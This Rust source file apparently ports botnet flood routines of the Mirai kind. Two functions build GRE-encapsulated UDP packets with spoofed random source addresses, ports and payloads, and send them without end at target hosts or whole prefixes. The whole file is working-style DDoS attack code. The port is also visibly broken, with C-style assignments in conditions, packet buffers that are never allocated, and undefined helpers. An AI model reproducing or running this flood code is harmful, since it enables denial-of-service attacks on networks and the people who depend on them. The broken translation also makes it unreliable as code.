use std::ffi::CString;
use std::net::Ipv4Addr;
use std::ptr;
use libc::{sockaddr_in, AF_INET, SOCK_RAW, IPPROTO_TCP, htons, setsockopt, IPPROTO_IP, IP_HDRINCL, sockaddr, MSG_NOSIGNAL};
use libc::{c_void, close};

type BOOL = bool;
type uint8_t = u8;
type uint16_t = u16;
type uint32_t = u32;
type port_t = u16;
type socklen_t = u32;

#[repr(C)]
struct AttackTarget {
    sock_addr: sockaddr_in,
    addr: Ipv4Addr,
    netmask: uint8_t,
}

#[repr(C)]
struct AttackOption {
    val: CString,
    key: uint8_t,
}

#[repr(C)]
struct IpHdr {
    version_ihl: uint8_t,
    tos: uint8_t,
    tot_len: uint16_t,
    id: uint16_t,
    frag_off: uint16_t,
    ttl: uint8_t,
    protocol: uint8_t,
    check: uint16_t,
    saddr: u32,
    daddr: u32,
}

#[repr(C)]
struct GreHdr {
    flags: uint16_t,
    protocol: uint16_t,
}

#[repr(C)]
struct UdpHdr {
    source: uint16_t,
    dest: uint16_t,
    len: uint16_t,
    check: uint16_t,
}

#[repr(C)]
struct EthHdr {
    h_dest: [u8; 6],
    h_source: [u8; 6],
    h_proto: uint16_t,
}

extern "C" {
    fn rand_next() -> uint32_t;
    fn htonl(hostlong: u32) -> u32;
    fn ntohl(netlong: u32) -> u32;
    fn htons(hostshort: u16) -> u16;
}

fn attack_gre_ip(targs_len: uint8_t, targs: *mut AttackTarget, opts_len: uint8_t, opts: *const AttackOption) {
    unsafe {
        let mut fd: i32;
        let mut pkts = vec![ptr::null_mut(); targs_len as usize];
        let ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0) as uint8_t;
        let ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff) as uint16_t;
        let ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64) as uint8_t;
        let dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, true);
        let sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff) as port_t;
        let dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff) as port_t;
        let data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
        let data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, true);
        let gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, false);
        let source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

        if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1 {
            #[cfg(debug_assertions)]
            println!("Failed to create raw socket. Aborting attack");
            return;
        }

        let i = 1;
        if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i as *const _ as *const c_void, std::mem::size_of_val(&i) as u32) == -1 {
            #[cfg(debug_assertions)]
            println!("Failed to set IP_HDRINCL. Aborting");
            close(fd);
            return;
        }

        for i in 0..targs_len {
            let iph = &mut *(pkts[i as usize] as *mut IpHdr);
            let greh = &mut *(iph.add(1) as *mut GreHdr);
            let greiph = &mut *(greh.add(1) as *mut IpHdr);
            let udph = &mut *(greiph.add(1) as *mut UdpHdr);

            // IP header init
            iph.version_ihl = 0x45;
            iph.tos = ip_tos;
            iph.tot_len = htons(std::mem::size_of::<IpHdr>() as uint16_t + std::mem::size_of::<GreHdr>() as uint16_t + std::mem::size_of::<IpHdr>() as uint16_t + std::mem::size_of::<UdpHdr>() as uint16_t + data_len);
            iph.id = htons(ip_ident);
            iph.ttl = ip_ttl;
            if dont_frag != 0 {
                iph.frag_off = htons(1 << 14);
            }
            iph.protocol = IPPROTO_GRE as uint8_t;
            iph.saddr = source_ip;
            iph.daddr = targs[i as usize].addr.into();

            // GRE header init
            greh.protocol = htons(ETH_P_IP); // Protocol is 2 bytes

            // Encapsulated IP header init
            greiph.version_ihl = 0x45;
            greiph.tos = ip_tos;
            greiph.tot_len = htons(std::mem::size_of::<IpHdr>() as uint16_t + std::mem::size_of::<UdpHdr>() as uint16_t + data_len);
            greiph.id = htons(!ip_ident);
            greiph.ttl = ip_ttl;
            if dont_frag != 0 {
                greiph.frag_off = htons(1 << 14);
            }
            greiph.protocol = IPPROTO_UDP as uint8_t;
            greiph.saddr = rand_next();
            if gcip != 0 {
                greiph.daddr = iph.daddr;
            } else {
                greiph.daddr = !(greiph.saddr - 1024);
            }

            // UDP header init
            udph.source = htons(sport);
            udph.dest = htons(dport);
            udph.len = htons(std::mem::size_of::<UdpHdr>() as uint16_t + data_len);
        }

        while true {
            for i in 0..targs_len {
                let pkt = pkts[i as usize];
                let iph = &mut *(pkt as *mut IpHdr);
                let greh = &mut *(iph.add(1) as *mut GreHdr);
                let greiph = &mut *(greh.add(1) as *mut IpHdr);
                let udph = &mut *(greiph.add(1) as *mut UdpHdr);
                let data = &mut *(udph.add(1) as *mut u8);

                // For prefix attacks
                if targs[i as usize].netmask < 32 {
                    iph.daddr = htonl(ntohl(targs[i as usize].addr.into()) + (rand_next() >> targs[i as usize].netmask));
                }

                if source_ip == 0xffffffff {
                    iph.saddr = rand_next();
                }

                if ip_ident == 0xffff {
                    iph.id = rand_next() & 0xffff;
                    greiph.id = !iph.id.wrapping_sub(1000);
                }
                if sport == 0xffff {
                    udph.source = rand_next() & 0xffff;
                }
                if dport == 0xffff {
                    udph.dest = rand_next() & 0xffff;
                }

                if gcip == 0 {
                    greiph.daddr = rand_next();
                } else {
                    greiph.daddr = iph.daddr;
                }

                if data_rand != 0 {
                    rand_str(data, data_len);
                }

                iph.check = 0;
                iph.check = checksum_generic(iph as *const _ as *const uint16_t, std::mem::size_of::<IpHdr>());

                greiph.check = 0;
                greiph.check = checksum_generic(greiph as *const _ as *const uint16_t, std::mem::size_of::<IpHdr>());

                udph.check = 0;
                udph.check = checksum_tcpudp(greiph, udph, udph.len, std::mem::size_of::<UdpHdr>() + data_len);

                targs[i as usize].sock_addr.sin_family = AF_INET as u16;
                targs[i as usize].sock_addr.sin_addr.s_addr = iph.daddr;
                targs[i as usize].sock_addr.sin_port = 0;
                sendto(fd, pkt as *const _, std::mem::size_of::<IpHdr>() + std::mem::size_of::<GreHdr>() + std::mem::size_of::<IpHdr>() + std::mem::size_of::<UdpHdr>() + data_len, MSG_NOSIGNAL, &targs[i as usize].sock_addr as *const _ as *const sockaddr, std::mem::size_of::<sockaddr_in>() as socklen_t);
            }

            #[cfg(debug_assertions)]
            if errno != 0 {
                println!("errno = {}", errno);
            }
            #[cfg(debug_assertions)]
            break;
        }
    }
}

fn attack_gre_eth(targs_len: uint8_t, targs: *mut AttackTarget, opts_len: uint8_t, opts: *const AttackOption) {
    unsafe {
        let mut fd: i32;
        let mut pkts = vec![ptr::null_mut(); targs_len as usize];
        let ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0) as uint8_t;
        let ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff) as uint16_t;
        let ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64) as uint8_t;
        let dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, true);
        let sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff) as port_t;
        let dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff) as port_t;
        let data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
        let data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, true);
        let gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, false);
        let source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

        if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1 {
            #[cfg(debug_assertions)]
            println!("Failed to create raw socket. Aborting attack");
            return;
        }

        let i = 1;
        if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i as *const _ as *const c_void, std::mem::size_of_val(&i) as u32) == -1 {
            #[cfg(debug_assertions)]
            println!("Failed to set IP_HDRINCL. Aborting");
            close(fd);
            return;
        }

        for i in 0..targs_len {
            let iph = &mut *(pkts[i as usize] as *mut IpHdr);
            let greh = &mut *(iph.add(1) as *mut GreHdr);
            let ethh = &mut *(greh.add(1) as *mut EthHdr);
            let greiph = &mut *(ethh.add(1) as *mut IpHdr);
            let udph = &mut *(greiph.add(1) as *mut UdpHdr);

            // IP header init
            iph.version_ihl = 0x45;
            iph.tos = ip_tos;
            iph.tot_len = htons(std::mem::size_of::<IpHdr>() as uint16_t + std::mem::size_of::<GreHdr>() as uint16_t + std::mem::size_of::<EthHdr>() as uint16_t + std::mem::size_of::<IpHdr>() as uint16_t + std::mem::size_of::<UdpHdr>() as uint16_t + data_len);
            iph.id = htons(ip_ident);
            iph.ttl = ip_ttl;
            if dont_frag != 0 {
                iph.frag_off = htons(1 << 14);
            }
            iph.protocol = IPPROTO_GRE as uint8_t;
            iph.saddr = source_ip;
            iph.daddr = targs[i as usize].addr.into();

            // GRE header init
            greh.protocol = htons(PROTO_GRE_TRANS_ETH); // Protocol is 2 bytes

            // Ethernet header init
            ethh.h_proto = htons(ETH_P_IP);

            // Encapsulated IP header init
            greiph.version_ihl = 0x45;
            greiph.tos = ip_tos;
            greiph.tot_len = htons(std::mem::size_of::<IpHdr>() as uint16_t + std::mem::size_of::<UdpHdr>() as uint16_t + data_len);
            greiph.id = htons(!ip_ident);
            greiph.ttl = ip_ttl;
            if dont_frag != 0 {
                greiph.frag_off = htons(1 << 14);
            }
            greiph.protocol = IPPROTO_UDP as uint8_t;
            greiph.saddr = rand_next();
            if gcip != 0 {
                greiph.daddr = iph.daddr;
            } else {
                greiph.daddr = !(greiph.saddr - 1024);
            }

            // UDP header init
            udph.source = htons(sport);
            udph.dest = htons(dport);
            udph.len = htons(std::mem::size_of::<UdpHdr>() as uint16_t + data_len);
        }

        while true {
            for i in 0..targs_len {
                let pkt = pkts[i as usize];
                let iph = &mut *(pkt as *mut IpHdr);
                let greh = &mut *(iph.add(1) as *mut GreHdr);
                let ethh = &mut *(greh.add(1) as *mut EthHdr);
                let greiph = &mut *(ethh.add(1) as *mut IpHdr);
                let udph = &mut *(greiph.add(1) as *mut UdpHdr);
                let data = &mut *(udph.add(1) as *mut u8);
                let ent1: u32;
                let ent2: u32;
                let ent3: u32;

                // For prefix attacks
                if targs[i as usize].netmask < 32 {
                    iph.daddr = htonl(ntohl(targs[i as usize].addr.into()) + (rand_next() >> targs[i as usize].netmask));
                }

                if source_ip == 0xffffffff {
                    iph.saddr = rand_next();
                }

                if ip_ident == 0xffff {
                    iph.id = rand_next() & 0xffff;
                    greiph.id = !iph.id.wrapping_sub(1000);
                }
                if sport == 0xffff {
                    udph.source = rand_next() & 0xffff;
                }
                if dport == 0xffff {
                    udph.dest = rand_next() & 0xffff;
                }

                if gcip == 0 {
                    greiph.daddr = rand_next();
                } else {
                    greiph.daddr = iph.daddr;
                }

                ent1 = rand_next();
                ent2 = rand_next();
                ent3 = rand_next();
                util_memcpy(ethh.h_dest.as_mut_ptr() as *mut c_void, &ent1 as *const _ as *const c_void, 4);
                util_memcpy(ethh.h_source.as_mut_ptr() as *mut c_void, &ent2 as *const _ as *const c_void, 4);
                util_memcpy(ethh.h_dest.as_mut_ptr().add(4) as *mut c_void, &ent3 as *const _ as *const c_void, 2);
                util_memcpy(ethh.h_source.as_mut_ptr().add(4) as *mut c_void, &ent3.wrapping_shr(16) as *const _ as *const c_void, 2);

                if data_rand != 0 {
                    rand_str(data, data_len);
                }

                iph.check = 0;
                iph.check = checksum_generic(iph as *const _ as *const uint16_t, std::mem::size_of::<IpHdr>());

                greiph.check = 0;
                greiph.check = checksum_generic(greiph as *const _ as *const uint16_t, std::mem::size_of::<IpHdr>());

                udph.check = 0;
                udph.check = checksum_tcpudp(greiph, udph, udph.len, std::mem::size_of::<UdpHdr>() + data_len);

                targs[i as usize].sock_addr.sin_family = AF_INET as u16;
                targs[i as usize].sock_addr.sin_addr.s_addr = iph.daddr;
                targs[i as usize].sock_addr.sin_port = 0;
                sendto(fd, pkt as *const _, std::mem::size_of::<IpHdr>() + std::mem::size_of::<GreHdr>() + std::mem::size_of::<EthHdr>() + std::mem::size_of::<IpHdr>() + std::mem::size_of::<UdpHdr>() + data_len, MSG_NOSIGNAL, &targs[i as usize].sock_addr as *const _ as *const sockaddr, std::mem::size_of::<sockaddr_in>() as socklen_t);
            }

            #[cfg(debug_assertions)]
            if errno != 0 {
                println!("errno = {}", errno);
            }
            #[cfg(debug_assertions)]
            break;
        }
    }
}
